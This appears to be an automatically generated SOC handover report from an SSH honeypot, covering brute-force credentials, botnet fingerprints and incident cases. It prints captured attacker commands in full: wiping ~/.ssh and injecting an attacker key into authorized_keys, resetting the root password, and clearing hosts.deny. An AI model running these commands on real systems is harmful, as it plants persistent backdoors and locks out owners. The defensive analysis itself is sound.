# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-05 |
| **Generated At** | 2026-06-05T09:58:50Z |
| **Shift Time** | 09:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **303** |
| Confirmed Threats | **290** |
| False Positives Filtered | **13** (4.3%) |
| Unique Attacker IPs | **49** |
| Countries of Origin | **18** |
| High Severity Cases | **62** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **241** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **182** |
| Unique Credential Pairs | **125** |
| Unique Usernames | **84** |
| Unique Passwords | **105** |
| Successful Auth Pairs | **38** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 62 |
| `345gs5662d34` | 29 |
| `ubuntu` | 5 |
| `admin` | 4 |
| `pi` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 29 |
| `3245gs5662d34` | 29 |
| `123456` | 18 |
| `123` | 3 |
| `Sz123456@` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 29 |
| `root` | `3245gs5662d34` | 29 |
| `root` | `Sz123456@` | 2 |
| `snmp` | `snmp123` | 1 |
| `root` | `linux` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `linux` | `222.223.62.8` | 2026-06-05T04:10:10 |
| `root` | `sunnada` | `203.150.107.244` | 2026-06-05T04:52:56 |
| `root` | `3245gs5662d34` | `203.150.107.244` | 2026-06-05T04:53:01 |
| `root` | `admin123456.` | `179.184.160.50` | 2026-06-05T06:31:41 |
| `root` | `qwer.1234` | `121.227.152.171` | 2026-06-05T08:36:51 |
| `root` | `Sz123456@` | `154.18.197.35` | 2026-06-05T08:38:44 |
| `root` | `3245gs5662d34` | `154.18.197.35` | 2026-06-05T08:38:47 |
| `root` | `Admin12!` | `35.208.7.216` | 2026-06-05T08:39:42 |
| `root` | `3245gs5662d34` | `35.208.7.216` | 2026-06-05T08:39:47 |
| `root` | `Fu123456` | `49.64.242.249` | 2026-06-05T08:41:04 |
| `root` | `luis123` | `49.64.242.249` | 2026-06-05T08:42:08 |
| `root` | `3245gs5662d34` | `49.64.242.249` | 2026-06-05T08:42:23 |
| `root` | `654321` | `35.208.7.216` | 2026-06-05T08:45:22 |
| `root` | `P@ssw0rd01!` | `223.197.186.7` | 2026-06-05T08:47:19 |
| `root` | `3245gs5662d34` | `223.197.186.7` | 2026-06-05T08:47:23 |
| `root` | `aaa123123` | `35.208.7.216` | 2026-06-05T08:50:47 |
| `root` | `1Q2w3e4r5t` | `223.197.186.7` | 2026-06-05T08:51:50 |
| `root` | `Lai123456` | `35.208.7.216` | 2026-06-05T08:52:33 |
| `root` | `Smart@2026` | `223.197.186.7` | 2026-06-05T08:54:11 |
| `root` | `Start@123` | `35.208.7.216` | 2026-06-05T08:56:23 |
| `root` | `foofoo` | `223.197.186.7` | 2026-06-05T08:58:47 |
| `root` | `hadoop` | `35.208.7.216` | 2026-06-05T09:00:13 |
| `root` | `ZabTharwat@2025` | `35.208.7.216` | 2026-06-05T09:02:02 |
| `root` | `a123456789*` | `223.197.186.7` | 2026-06-05T09:03:17 |
| `root` | `2357` | `223.197.186.7` | 2026-06-05T09:05:41 |
| `root` | `Qwer123123` | `35.208.7.216` | 2026-06-05T09:07:31 |
| `root` | `Niraj@123` | `35.208.7.216` | 2026-06-05T09:11:12 |
| `root` | `Abc12345678` | `35.208.7.216` | 2026-06-05T09:13:10 |
| `root` | `@163.com` | `35.208.7.216` | 2026-06-05T09:15:05 |
| `root` | `7890uiop` | `35.208.7.216` | 2026-06-05T09:16:55 |
| `root` | `adminserver` | `35.208.7.216` | 2026-06-05T09:20:38 |
| `root` | `Root.1234` | `223.197.186.7` | 2026-06-05T09:21:59 |
| `root` | `Sugipula123` | `35.208.7.216` | 2026-06-05T09:22:26 |
| `root` | `1236547890` | `35.208.7.216` | 2026-06-05T09:24:14 |
| `root` | `BB-123456` | `223.197.186.7` | 2026-06-05T09:28:57 |
| `root` | `1234567899` | `35.208.7.216` | 2026-06-05T09:31:39 |
| `root` | `Sz123456@` | `223.197.186.7` | 2026-06-05T09:38:07 |
| `root` | `Qwerty123#` | `223.197.186.7` | 2026-06-05T09:42:40 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **303** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 236 |
| OpenSSH | 4 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 162 | 10 |
| `03a80b21afa8...` | Modern SSH client | 67 | 4 |
| `0df0d56bb50c...` | Generic scanner | 2 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |
| `bc9e7273cde2...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 162 | 10 | Mirai/variant |
| `03a80b21afa8...` | libssh | 67 | 4 | Modern SSH client |
| `95420f9d932d...` | libssh | 6 | 5 | — |
| `0df0d56bb50c...` | OpenSSH | 2 | 1 | Generic scanner |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `bc9e7273cde2...` | OpenSSH | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 29 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:51QQVbRvMp0p"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `179.184.160.50`, `49.64.242.249`, `121.227.152.171`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `35.208.7.216`, `203.150.107.244`, `49.64.242.249`, `223.197.186.7`, `154.18.197.35`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **49** |
| Unique ASNs | **36** |
| High-Risk ASNs | **30** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS16509` | Amazon.com, Inc. | 3 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS6939` | Hurricane Electric LLC | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS7018` | AT&T Enterprises, LLC | 1 | HIGH |
| `AS18809` | Cable Onda | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (62)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c8461d53de1b

| Field | Detail |
|---|---|
| **Source IP** | `222.223.62[.]8` |
| **First Seen** | 2026-06-05 04:08 |
| **Last Seen** | 2026-06-05 04:11 |
| **Session Duration** | 167s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 04:08:18` | `cowrie.session.connect` |
| `2026-06-05 04:10:09` | `cowrie.client.version` |
| `2026-06-05 04:10:09` | `cowrie.client.kex` |
| `2026-06-05 04:10:10` | `cowrie.login.success` |
| `2026-06-05 04:11:05` | `cowrie.session.file_upload` |
| `2026-06-05 04:11:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.223.62[.]8` to AbuseIPDB if not already reported
- [ ] Block `222.223.62[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d696580f9c53

| Field | Detail |
|---|---|
| **Source IP** | `203.150.107[.]244` |
| **First Seen** | 2026-06-05 04:52 |
| **Last Seen** | 2026-06-05 04:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 04:52:55` | `cowrie.session.connect` |
| `2026-06-05 04:52:55` | `cowrie.client.version` |
| `2026-06-05 04:52:56` | `cowrie.client.kex` |
| `2026-06-05 04:52:56` | `cowrie.login.success` |
| `2026-06-05 04:52:57` | `cowrie.session.params` |
| `2026-06-05 04:52:57` | `cowrie.command.input` |
| `2026-06-05 04:52:57` | `cowrie.command.failed` |
| `2026-06-05 04:52:57` | `cowrie.log.closed` |
| `2026-06-05 04:52:57` | `cowrie.session.params` |
| `2026-06-05 04:52:57` | `cowrie.command.input` |
| `2026-06-05 04:52:58` | `cowrie.session.file_download` |
| `2026-06-05 04:52:58` | `cowrie.log.closed` |
| `2026-06-05 04:53:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.150.107[.]244` to AbuseIPDB if not already reported
- [ ] Block `203.150.107[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a513d123234b

| Field | Detail |
|---|---|
| **Source IP** | `203.150.107[.]244` |
| **First Seen** | 2026-06-05 04:53 |
| **Last Seen** | 2026-06-05 04:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 04:53:00` | `cowrie.session.connect` |
| `2026-06-05 04:53:00` | `cowrie.client.version` |
| `2026-06-05 04:53:01` | `cowrie.client.kex` |
| `2026-06-05 04:53:01` | `cowrie.login.success` |
| `2026-06-05 04:53:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.150.107[.]244` to AbuseIPDB if not already reported
- [ ] Block `203.150.107[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b485ef7f8db2

| Field | Detail |
|---|---|
| **Source IP** | `179.184.160[.]50` |
| **First Seen** | 2026-06-05 06:31 |
| **Last Seen** | 2026-06-05 06:32 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:51QQVbRvMp0p"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 06:31:39` | `cowrie.session.connect` |
| `2026-06-05 06:31:39` | `cowrie.client.version` |
| `2026-06-05 06:31:39` | `cowrie.client.kex` |
| `2026-06-05 06:31:41` | `cowrie.login.success` |
| `2026-06-05 06:31:42` | `cowrie.session.params` |
| `2026-06-05 06:31:42` | `cowrie.command.input` |
| `2026-06-05 06:31:42` | `cowrie.command.failed` |
| `2026-06-05 06:31:42` | `cowrie.log.closed` |
| `2026-06-05 06:31:43` | `cowrie.session.params` |
| `2026-06-05 06:31:43` | `cowrie.command.input` |
| `2026-06-05 06:31:43` | `cowrie.session.file_download` |
| `2026-06-05 06:31:43` | `cowrie.log.closed` |
| `2026-06-05 06:32:01` | `cowrie.session.params` |
| `2026-06-05 06:32:01` | `cowrie.command.input` |
| `2026-06-05 06:32:01` | `cowrie.log.closed` |
| `2026-06-05 06:32:02` | `cowrie.session.params` |
| `2026-06-05 06:32:02` | `cowrie.command.input` |
| `2026-06-05 06:32:02` | `cowrie.log.closed` |
| `2026-06-05 06:32:03` | `cowrie.session.params` |
| `2026-06-05 06:32:03` | `cowrie.command.input` |
| `2026-06-05 06:32:03` | `cowrie.session.file_download` |
| `2026-06-05 06:32:03` | `cowrie.log.closed` |
| `2026-06-05 06:32:04` | `cowrie.session.params` |
| `2026-06-05 06:32:04` | `cowrie.command.input` |
| `2026-06-05 06:32:04` | `cowrie.log.closed` |
| `2026-06-05 06:32:05` | `cowrie.session.params` |
| `2026-06-05 06:32:05` | `cowrie.command.input` |
| `2026-06-05 06:32:05` | `cowrie.log.closed` |
| `2026-06-05 06:32:06` | `cowrie.session.params` |
| `2026-06-05 06:32:06` | `cowrie.command.input` |
| `2026-06-05 06:32:06` | `cowrie.command.input` |
| `2026-06-05 06:32:06` | `cowrie.log.closed` |
| `2026-06-05 06:32:07` | `cowrie.session.params` |
| `2026-06-05 06:32:07` | `cowrie.command.input` |
| `2026-06-05 06:32:07` | `cowrie.log.closed` |
| `2026-06-05 06:32:08` | `cowrie.session.params` |
| `2026-06-05 06:32:08` | `cowrie.command.input` |
| `2026-06-05 06:32:08` | `cowrie.log.closed` |
| `2026-06-05 06:32:09` | `cowrie.session.params` |
| `2026-06-05 06:32:09` | `cowrie.command.input` |
| `2026-06-05 06:32:10` | `cowrie.log.closed` |
| `2026-06-05 06:32:10` | `cowrie.session.params` |
| `2026-06-05 06:32:10` | `cowrie.command.input` |
| `2026-06-05 06:32:11` | `cowrie.log.closed` |
| `2026-06-05 06:32:11` | `cowrie.session.params` |
| `2026-06-05 06:32:11` | `cowrie.command.input` |
| `2026-06-05 06:32:12` | `cowrie.log.closed` |
| `2026-06-05 06:32:12` | `cowrie.session.params` |
| `2026-06-05 06:32:12` | `cowrie.command.input` |
| `2026-06-05 06:32:13` | `cowrie.log.closed` |
| `2026-06-05 06:32:13` | `cowrie.session.params` |
| `2026-06-05 06:32:13` | `cowrie.command.input` |
| `2026-06-05 06:32:14` | `cowrie.log.closed` |
| `2026-06-05 06:32:14` | `cowrie.session.params` |
| `2026-06-05 06:32:14` | `cowrie.command.input` |
| `2026-06-05 06:32:15` | `cowrie.log.closed` |
| `2026-06-05 06:32:16` | `cowrie.session.params` |
| `2026-06-05 06:32:16` | `cowrie.command.input` |
| `2026-06-05 06:32:16` | `cowrie.log.closed` |
| `2026-06-05 06:32:17` | `cowrie.session.params` |
| `2026-06-05 06:32:17` | `cowrie.command.input` |
| `2026-06-05 06:32:17` | `cowrie.log.closed` |
| `2026-06-05 06:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.160[.]50` to AbuseIPDB if not already reported
- [ ] Block `179.184.160[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e66a0be7c2ba

| Field | Detail |
|---|---|
| **Source IP** | `121.227.152[.]171` |
| **First Seen** | 2026-06-05 08:36 |
| **Last Seen** | 2026-06-05 08:37 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:CkZCS0tWDKnD"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:36:50` | `cowrie.session.connect` |
| `2026-06-05 08:36:50` | `cowrie.client.version` |
| `2026-06-05 08:36:50` | `cowrie.client.kex` |
| `2026-06-05 08:36:51` | `cowrie.login.success` |
| `2026-06-05 08:36:52` | `cowrie.session.params` |
| `2026-06-05 08:36:52` | `cowrie.command.input` |
| `2026-06-05 08:36:52` | `cowrie.command.failed` |
| `2026-06-05 08:36:52` | `cowrie.log.closed` |
| `2026-06-05 08:36:52` | `cowrie.session.params` |
| `2026-06-05 08:36:52` | `cowrie.command.input` |
| `2026-06-05 08:36:53` | `cowrie.session.file_download` |
| `2026-06-05 08:36:53` | `cowrie.log.closed` |
| `2026-06-05 08:37:05` | `cowrie.session.params` |
| `2026-06-05 08:37:05` | `cowrie.command.input` |
| `2026-06-05 08:37:05` | `cowrie.log.closed` |
| `2026-06-05 08:37:05` | `cowrie.session.params` |
| `2026-06-05 08:37:05` | `cowrie.command.input` |
| `2026-06-05 08:37:05` | `cowrie.log.closed` |
| `2026-06-05 08:37:06` | `cowrie.session.params` |
| `2026-06-05 08:37:06` | `cowrie.command.input` |
| `2026-06-05 08:37:06` | `cowrie.session.file_download` |
| `2026-06-05 08:37:06` | `cowrie.log.closed` |
| `2026-06-05 08:37:06` | `cowrie.session.params` |
| `2026-06-05 08:37:06` | `cowrie.command.input` |
| `2026-06-05 08:37:06` | `cowrie.log.closed` |
| `2026-06-05 08:37:07` | `cowrie.session.params` |
| `2026-06-05 08:37:07` | `cowrie.command.input` |
| `2026-06-05 08:37:07` | `cowrie.log.closed` |
| `2026-06-05 08:37:07` | `cowrie.session.params` |
| `2026-06-05 08:37:07` | `cowrie.command.input` |
| `2026-06-05 08:37:07` | `cowrie.command.input` |
| `2026-06-05 08:37:07` | `cowrie.log.closed` |
| `2026-06-05 08:37:08` | `cowrie.session.params` |
| `2026-06-05 08:37:08` | `cowrie.command.input` |
| `2026-06-05 08:37:08` | `cowrie.log.closed` |
| `2026-06-05 08:37:08` | `cowrie.session.params` |
| `2026-06-05 08:37:08` | `cowrie.command.input` |
| `2026-06-05 08:37:08` | `cowrie.log.closed` |
| `2026-06-05 08:37:08` | `cowrie.session.params` |
| `2026-06-05 08:37:08` | `cowrie.command.input` |
| `2026-06-05 08:37:09` | `cowrie.log.closed` |
| `2026-06-05 08:37:09` | `cowrie.session.params` |
| `2026-06-05 08:37:09` | `cowrie.command.input` |
| `2026-06-05 08:37:09` | `cowrie.log.closed` |
| `2026-06-05 08:37:09` | `cowrie.session.params` |
| `2026-06-05 08:37:09` | `cowrie.command.input` |
| `2026-06-05 08:37:10` | `cowrie.log.closed` |
| `2026-06-05 08:37:10` | `cowrie.session.params` |
| `2026-06-05 08:37:10` | `cowrie.command.input` |
| `2026-06-05 08:37:10` | `cowrie.log.closed` |
| `2026-06-05 08:37:10` | `cowrie.session.params` |
| `2026-06-05 08:37:10` | `cowrie.command.input` |
| `2026-06-05 08:37:10` | `cowrie.log.closed` |
| `2026-06-05 08:37:11` | `cowrie.session.params` |
| `2026-06-05 08:37:11` | `cowrie.command.input` |
| `2026-06-05 08:37:11` | `cowrie.log.closed` |
| `2026-06-05 08:37:11` | `cowrie.session.params` |
| `2026-06-05 08:37:11` | `cowrie.command.input` |
| `2026-06-05 08:37:11` | `cowrie.log.closed` |
| `2026-06-05 08:37:12` | `cowrie.session.params` |
| `2026-06-05 08:37:12` | `cowrie.command.input` |
| `2026-06-05 08:37:12` | `cowrie.log.closed` |
| `2026-06-05 08:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.227.152[.]171` to AbuseIPDB if not already reported
- [ ] Block `121.227.152[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89eb33bf5493

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-06-05 08:38 |
| **Last Seen** | 2026-06-05 08:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:38:44` | `cowrie.session.connect` |
| `2026-06-05 08:38:44` | `cowrie.client.version` |
| `2026-06-05 08:38:44` | `cowrie.client.kex` |
| `2026-06-05 08:38:44` | `cowrie.login.success` |
| `2026-06-05 08:38:44` | `cowrie.session.params` |
| `2026-06-05 08:38:44` | `cowrie.command.input` |
| `2026-06-05 08:38:44` | `cowrie.command.failed` |
| `2026-06-05 08:38:45` | `cowrie.log.closed` |
| `2026-06-05 08:38:45` | `cowrie.session.params` |
| `2026-06-05 08:38:45` | `cowrie.command.input` |
| `2026-06-05 08:38:45` | `cowrie.session.file_download` |
| `2026-06-05 08:38:45` | `cowrie.log.closed` |
| `2026-06-05 08:38:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a4b751b9c38

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-06-05 08:38 |
| **Last Seen** | 2026-06-05 08:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:38:47` | `cowrie.session.connect` |
| `2026-06-05 08:38:47` | `cowrie.client.version` |
| `2026-06-05 08:38:47` | `cowrie.client.kex` |
| `2026-06-05 08:38:47` | `cowrie.login.success` |
| `2026-06-05 08:38:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
